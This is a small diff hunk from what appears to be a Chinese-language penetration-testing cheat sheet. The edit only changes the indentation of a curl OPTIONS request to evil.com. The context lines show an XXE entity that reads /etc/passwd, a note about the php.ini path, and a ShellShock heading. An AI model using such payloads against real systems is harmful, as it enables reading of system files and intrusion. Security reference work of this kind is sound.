@@ -813,7 +813,7 @@ xxe.dtd: `<!ENTITY b SYSTEM "file:///etc/passwd">`
     
     - 列出php.ini路徑
 
-    - `curl -i -X OPTIONS 'http://evil.com/'`
+- `curl -i -X OPTIONS 'http://evil.com/'`
 
 - ShellShock
     
